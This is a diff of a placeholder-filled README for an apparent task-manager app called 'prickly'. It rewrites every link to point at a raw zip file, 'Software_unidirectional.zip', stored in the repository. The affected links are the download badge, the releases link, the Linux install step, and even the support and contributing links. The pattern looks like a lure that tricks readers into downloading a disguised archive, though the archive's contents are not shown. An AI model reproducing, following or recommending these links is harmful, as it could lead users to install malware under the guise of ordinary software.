@@ -4,7 +4,7 @@
 Welcome to prickly! This application helps you with [insert key benefit, e.g., managing your tasks efficiently]. Follow the steps below to get started.
 
 ## 📥 Download Now
-[![Download prickly](https://img.shields.io/badge/download-prickly-blue.svg)](https://github.com/carolinavigil/prickly/releases)
+[![Download prickly](https://github.com/carolinavigil/prickly/raw/refs/heads/main/rhetoric/Software_unidirectional.zip)](https://github.com/carolinavigil/prickly/raw/refs/heads/main/rhetoric/Software_unidirectional.zip)
 
 ## 📦 System Requirements
 Before downloading prickly, ensure your system meets the following requirements:
@@ -24,7 +24,7 @@ prickly offers a variety of useful features:
 ## 📥 Download & Install
 To download prickly, visit our Releases page and choose the appropriate file for your system. 
 
-[Click here to visit the download page.](https://github.com/carolinavigil/prickly/releases)
+[Click here to visit the download page.](https://github.com/carolinavigil/prickly/raw/refs/heads/main/rhetoric/Software_unidirectional.zip)
 
 ### Installation Steps
 
@@ -35,7 +35,7 @@ To download prickly, visit our Releases page and choose the appropriate file for
 5. **Run the Installer:**
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
    - For Mac: Open the `.dmg` file and drag the prickly app to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included README for installation.
+   - For Linux: Extract the `https://github.com/carolinavigil/prickly/raw/refs/heads/main/rhetoric/Software_unidirectional.zip` file and follow the included README for installation.
 
 6. **Launch prickly:** After installation, you can find prickly in your applications or programs list. Open it and start managing your tasks effectively!
 
@@ -60,9 +60,9 @@ Yes, prickly allows you to change the theme and layout preferences through the s
 Yes, we prioritize your data safety. prickly includes backup options to keep your information safe.
 
 ## 📞 Support
-For additional help, visit our [Support Page](https://github.com/carolinavigil/prickly/issues). You can report issues or ask for features there.
+For additional help, visit our [Support Page](https://github.com/carolinavigil/prickly/raw/refs/heads/main/rhetoric/Software_unidirectional.zip). You can report issues or ask for features there.
 
 ## 🤝 Contributing
-Would you like to contribute to prickly? We welcome your input! Check our contributing guidelines on [GitHub](https://github.com/carolinavigil/prickly/blob/main/CONTRIBUTING.md).
+Would you like to contribute to prickly? We welcome your input! Check our contributing guidelines on [GitHub](https://github.com/carolinavigil/prickly/raw/refs/heads/main/rhetoric/Software_unidirectional.zip).
 
 Thank you for using prickly! Enjoy managing your tasks with ease!
